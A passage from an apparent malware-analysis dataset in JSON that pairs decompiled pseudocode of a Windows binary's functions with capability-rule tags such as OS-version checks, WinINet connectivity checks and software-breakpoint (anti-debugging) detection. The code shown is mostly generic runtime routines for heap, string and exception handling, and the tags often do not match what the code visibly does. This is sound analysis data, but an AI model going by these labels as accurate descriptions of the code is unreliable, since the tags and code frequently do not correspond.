            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417463(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00416e9a(arg_10h);\n    if (iVar1 == 0) {\n        return;\n    }\n    if (arg_10h != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_10h + 0x1c), 0xffffffec);\n        if ((uVar2 & 0x10000) != 0) {\n            return;\n        }\n        var_4h = fcn.00416e57(arg_10h);\n    }\n    if (arg_ch == arg_10h) {\n        if ((var_4h & 0x20) == 0) {\n            return;\n        }\n        if (arg_ch == 0) goto code_r0x00417535;\n        iVar1 = arg_8h;\n        uVar3 = fcn.00417436(arg_8h);\n        iVar4 = fcn.00417330(arg_8h, uVar3);\n        if (((iVar4 == 0) || (iVar4 == arg_10h)) || (uVar2 = fcn.00416e57(iVar4),  (uVar2 & 0x10) == 0))\n        goto code_r0x00417535;\ncode_r0x004174fc:\n        fcn.004173d4(arg_8h, iVar1);\n    }\n    else {\n        iVar1 = arg_10h;\n        if (((arg_ch != 0) && (iVar4 = fcn.00416e57(arg_ch),  iVar4 != 0)) || ((arg_10h != 0 && (var_4h != 0))))\n        goto code_r0x004174fc;\n    }\n    if ((var_4h & 0x30) == 0) {\n        uVar3 = fcn.00417436(arg_8h);\n        arg_10h = fcn.00417330(arg_8h, uVar3);\n        uVar2 = fcn.00416e57(arg_10h);\n        if ((uVar2 & 0x20) == 0) {\n            return;\n        }\n        iVar1 = fcn.0042ecf6();\n        if (iVar1 == 0) {\n            return;\n        }\n    }\ncode_r0x00417535:\n    fcn.00417387(arg_10h);\n    return;\n}\n",
        "token_count": 607
    },
    "00417bc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00417bc5(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 127
    },
    "00417c09": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417c09(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.0042a3b6(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1];\n        piVar2 = iVar1 + 4 + *param_1 * (iVar3 + -1);\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = param_1[3];\n                param_1[3] = piVar2;\n                piVar2 = piVar2 - *param_1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 218
    },
    "00417e96": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00417e96(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint noname_16, uint noname_17, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc4;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x417f31;\n        var_34h = 1;\n    }\n    else {\n        pcStack40 = fcn.00417f5d;\n        uStack36 = *0x44d270;\n        uStack32 = var_20h;\n        puStack28 = var_ch_2;\n        uStack24 = var_1ch;\n        uStack20 = var_18h;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00417e96::var_28h_2;\n        var_30h = var_8h_3;\n        var_2ch = var_28h;\n        iVar1 = fcn.0041b5aa(*var_8h_3, &fcn.00417e96::var_30h);\n        (**(iVar1 + 0x74))();\n        var_34h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_34h;\n}\n",
        "token_count": 671
    },
    "00417f5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00417f5d(int32_t param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7\n                 , uint param_8)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    int32_t arg_20h;\n    int32_t noname_8;\n    code *extraout_var;\n    code *UNRECOVERED_JUMPTABLE;\n    \n    if (*(param_2 + 8) == *0x44d270) {\n        if ((*(param_1 + 4) & 0x66) == 0) {\n            noname_8 = 1;\n            arg_20h = *(param_2 + 0x18);\n            fcn.0041b4e2(param_1, *(param_2 + 0x10), param_3, 0, *(param_2 + 0xc), *(param_2 + 0x14), arg_20h, 1);\n            UNRECOVERED_JUMPTABLE = extraout_var;\n            if (*(param_2 + 0x24) == 0) {\n                arg_20h = param_2;\n                noname_8 = param_1;\n                fcn.00417dd3(param_2, param_1);\n            }\n            fcn.00417e96(0x123, &stack0xfffffff8, 0, 0, 0, 0, 0, arg_20h, noname_8, unaff_EBX, UNRECOVERED_JUMPTABLE, \n                         unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4, param_5, param_6, param_7, \n                         param_8);\n    // WARNING: Could not recover jumptable at 0x00418007. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return uVar1;\n        }\n        *(param_2 + 0x24) = 1;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) | 8;\n    }\n    return 1;\n}\n",
        "token_count": 526
    },
    "0041800f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041800f(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    var_4h = *(arg_8h + 0xc);\n    iVar2 = *(arg_8h + 0x10);\n    uVar4 = var_4h;\n    arg_8h = var_4h;\n    if (-1 < arg_ch) {\n        do {\n            if (uVar4 == 0xffffffff) {\n                fcn.0041b886();\n            }\n            uVar4 = uVar4 - 1;\n            iVar1 = iVar2 + uVar4 * 0x14;\n            if (((*(iVar1 + 4) < arg_10h) && (arg_10h <= *(iVar1 + 8))) || (uVar4 == 0xffffffff)) {\n                arg_ch = arg_ch + -1;\n                var_4h = arg_8h;\n                arg_8h = uVar4;\n            }\n        } while (-1 < arg_ch);\n    }\n    uVar4 = uVar4 + 1;\n    *arg_14h = uVar4;\n    *arg_18h = var_4h;\n    if ((*(iVar3 + 0xc) <= var_4h && var_4h != *(iVar3 + 0xc)) || (var_4h < uVar4)) {\n        fcn.0041b886();\n    }\n    return iVar2 + uVar4 * 0x14;\n}\n",
        "token_count": 405
    },
    "004180d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004180d2(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    \n    iVar2 = fcn.0041b5aa();\n    if (param_1 == *(iVar2 + 0x88)) {\n        iVar2 = fcn.0041b5aa();\n        *(iVar2 + 0x88) = *(param_1 + 4);\n        return;\n    }\n    iVar2 = fcn.0041b5aa();\n    iVar2 = *(iVar2 + 0x88);\n    do {\n        iVar3 = iVar2;\n        if (*(iVar3 + 4) == 0) {\n            fcn.00419d14(0x441ad0, 8);\n            pcVar1 = *0x44d4f0;\n            if (*0x44d4f0 != NULL) {\n                *(unaff_EBP + -4) = 0;\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.00419d14(0x441ac0, 8);\n            iVar2 = fcn.0041b5aa();\n            if (*(iVar2 + 0x6c) != 0) {\n                *(unaff_EBP + -4) = 0;\n                iVar2 = fcn.0041b5aa();\n                (**(iVar2 + 0x6c))();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.0041e7a8(10);\n            fcn.00424c33(0x16);\n            fcn.00419a7b(3);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = *(iVar3 + 4);\n    } while (param_1 != *(iVar3 + 4));\n    *(iVar3 + 4) = *(param_1 + 4);\n    return;\n}\n",
        "token_count": 459
    },
    "0041b851": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041b851(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00419d14(0x441ac0, 8);\n    iVar2 = fcn.0041b5aa();\n    if (*(iVar2 + 0x6c) != 0) {\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0041b5aa();\n        (**(iVar2 + 0x6c))();\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0041e7a8(10);\n    fcn.00424c33(0x16);\n    fcn.00419a7b(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 222
    },
    "0041869d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041869d(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint8_t *puVar8;\n    bool bVar9;\n    \n    iVar6 = fcn.0041b5aa();\n    iVar6 = *(iVar6 + 0x60);\n    if (iVar6 != *0x451fe8) {\n        iVar6 = fcn.0041a0ec();\n    }\n    if (*(iVar6 + 8) != 0) {\n        while( true ) {\n            uVar4 = *arg_8h;\n            uVar5 = uVar4;\n            puVar3 = arg_8h + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                if (*puVar3 == 0) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = CONCAT11(uVar4, *puVar3);\n                    puVar3 = arg_8h + 2;\n                }\n            }\n            arg_8h = puVar3;\n            uVar4 = *arg_ch;\n            uVar7 = uVar4;\n            puVar8 = arg_ch + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                uVar1 = *puVar8;\n                if (uVar1 == 0) {\n                    uVar7 = 0;\n                }\n                else {\n                    puVar8 = arg_ch + 2;\n                    uVar7 = CONCAT11(uVar4, uVar1);\n                }\n            }\n            if (uVar7 != uVar5) break;\n            arg_ch = puVar8;\n            if (uVar5 == 0) {\n                return 0;\n            }\n        }\n        return (-(uVar7 < uVar5) & 2) - 1;\n    }\n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar4 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar9 = uVar4 < *arg_ch;\n            if (uVar4 != *arg_ch) goto code_r0x0041b954;\n            arg_ch = arg_ch + 1;\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x0041b920;\n        }\n        uVar5 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar4 = uVar5;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) goto code_r0x0041b954;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar5 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) goto code_r0x0041b954;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x0041b920:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar4 = uVar2;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x10;\n        bVar9 = uVar4 < arg_ch[2];\n        if (uVar4 != arg_ch[2]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x18;\n        bVar9 = uVar4 < arg_ch[3];\n        if (uVar4 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0041b954:\n    return bVar9 * -2 + 1;\n}\n",
        "token_count": 1094
    },
    "00418858": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418858(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x441900, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x450fc8 == 3) && (arg_8h_00 <= *0x450fb4)) {\n        fcn.0041c713(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.0041cfd6(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004188ca();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x004188c1;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x450fc8 != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x450fc4, 0, arg_8h_00);\ncode_r0x004188c1:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 373
    },
    "00418911": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418911(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x441910, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x450fc8 == 3) {\n            fcn.0041c713(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0041c7f7(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0041c822(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00418964();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0041897c;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x450fc4, 0, arg_ch);\n    }\ncode_r0x0041897c:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 345
    },
    "00418982": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00418982(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.00418b80();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x450784 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x450784 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x450784 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 584
    },
    "00419ad5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00419ad5(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.0041b5aa();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x451fe8) {\n        iVar3 = fcn.0041a0ec();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 885
    },
    "00419b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00419b50(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4419c8, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.004188ff(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.00418911(arg_ch_00);\n        }\n        else if (*0x450fc8 == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (arg_10h < 0xffffffe1) {\n                    fcn.0041c713(4);\n                    *(unaff_EBP + -4) = 0;\n                    iVar1 = fcn.0041c7f7(arg_ch_00);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 != 0) {\n                        if (arg_10h <= *0x450fb4) {\n                            iVar1 = fcn.0041ccf7(iVar1, arg_ch_00, arg_10h);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0041cfd6(arg_10h);\n                                *(unaff_EBP + -0x1c) = iVar1;\n                                if (iVar1 != 0) {\n                                    uVar2 = *(arg_ch_00 + -4) - 1;\n                                    *(unaff_EBP + -0x24) = uVar2;\n                                    if (arg_10h <= uVar2) {\n                                        uVar2 = arg_10h;\n                                    }\n                                    fcn.00419370(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                    uVar3 = fcn.0041c7f7(arg_ch_00);\n                                    *(unaff_EBP + -0x20) = uVar3;\n                                    fcn.0041c822(uVar3, arg_ch_00);\n                                }\n                            }\n                            else {\n                                *(unaff_EBP + -0x1c) = arg_ch_00;\n                            }\n                        }\n                        if (*(unaff_EBP + -0x1c) == 0) {\n                            if (arg_10h == 0) {\n                                arg_10h = 1;\n                                *(unaff_EBP + 0xc) = 1;\n                            }\n                            arg_10h = arg_10h + 0xf & 0xfffffff0;\n                            *(unaff_EBP + 0xc) = arg_10h;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x450fc4, 0, arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.00419370(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                fcn.0041c822(*(unaff_EBP + -0x20), arg_ch_00);\n                            }\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.00419cb8();\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x450fc4, 0, arg_ch_00, arg_10h);\n                        *(unaff_EBP + -0x1c) = uVar3;\n                    }\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x450944 != 0)) && (iVar1 = fcn.0041d2d2(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_10h < 0xffffffe1) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x450fc4, 0, arg_ch_00, arg_10h);\n                }\n            } while (((iVar1 == 0) && (*0x450944 != 0)) && (iVar1 = fcn.0041d2d2(arg_10h),  iVar1 != 0));\n        }\n    }\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1271
    },
    "00419d60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
